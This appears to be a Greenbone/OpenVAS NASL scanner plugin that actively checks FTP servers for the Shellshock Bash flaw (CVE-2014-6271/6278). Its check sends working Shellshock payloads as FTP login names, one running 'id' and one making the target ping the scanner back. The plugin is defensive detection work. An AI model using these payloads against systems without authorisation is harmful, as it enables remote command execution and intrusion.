# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105094");
  script_version("2024-11-13T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-01 21:38:00 +0000 (Mon, 01 Feb 2021)");

  script_cve_id("CVE-2014-6271", "CVE-2014-6278");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/banner/available");

  script_name("GNU Bash Environment Variable Handling RCE Vulnerability (Shellshock, FTP, CVE-2014-6271/CVE-2014-6278) - Active Check");

  script_tag(name:"summary", value:"GNU Bash is prone to a remote command execution (RCE)
  vulnerability dubbed 'Shellshock'.");

  script_tag(name:"vuldetect", value:"Two different methods are used:

  1. Sends a crafted FTP login request and checks the response.

  2. Sends a crafted FTP login request and checks if the target is connecting back to the scanner
  host.

  Note: For a successful detection of this flaw via the second method the scanner host needs to be
  able to directly receive ICMP echo requests from the target.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote or local attackers to
  inject shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector.");

  script_tag(name:"affected", value:"GNU Bash versions 1.0.3 through 4.3.");

  script_tag(name:"solution", value:"Update to patch version bash43-025 of Bash 4.3 or later.");

  script_xref(name:"URL", value:"https://access.redhat.com/security/vulnerabilities/shellshock");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70103");
  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210420171418/https://blogs.akamai.com/2014/09/environment-bashing.html");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-shellshock-vulnerability");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-remote-code-execution-vulnerability-cve-2014-6271");
  script_xref(name:"URL", value:"https://shellshocker.net/");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/252743");
  script_xref(name:"URL", value:"https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

port = ftp_get_port( default:21 );

id_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;",
                      "() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }" );

foreach id_user( id_users ) {

  id_pass = id_user;

  if( ! soc = ftp_open_socket( port:port ) )
    continue;

  send( socket:soc, data:"USER " + id_user + '\r\n' );
  recv = recv( socket:soc, length:1024 );

  send( socket:soc, data:"PASS " + id_pass + '\r\n' );
  recv += recv( socket:soc, length:1024 );

  ftp_close( socket:soc );

  if( ! recv )
    continue;

  if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" ) {
    report = 'By sending a special request it was possible to execute `' + id_user + '` on the remote host.\n\nReceived answer:\n\n' + recv;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  vtstrings = get_vt_strings();
  str = vtstrings["ping_string"];
  pattern = hexstr( str );
  p_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + connect_back_target,
                       "{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + connect_back_target + "; }" );

  foreach user( p_users ) {

    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would
    # share the same socket causing race conditions and similar.
    #
    # In this case this also includes pcap_src_ip_filter_from_hostnames() from above.
    if( ! soc = ftp_open_socket( port:port ) )
      continue;

    pass = user;

    send( socket:soc, data:"USER " + user + '\r\n' );
    recv( socket:soc, length:1024 );
    send( socket:soc, data:"PASS " + pass + '\r\n' );

    res = send_capture( socket:soc, data:"", pcap_filter:filter );

    ftp_close( socket:soc );

    if( ! res  )
      continue;

    type = get_icmp_element( icmp:res, element:"icmp_type" );
    if( ! type || type != 8 )
      continue;

    if( ! data = get_icmp_element( icmp:res, element:"data" ) )
      continue;

    if( str >< data ) {
      report = 'By sending a special request it was possible to execute `' + user + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
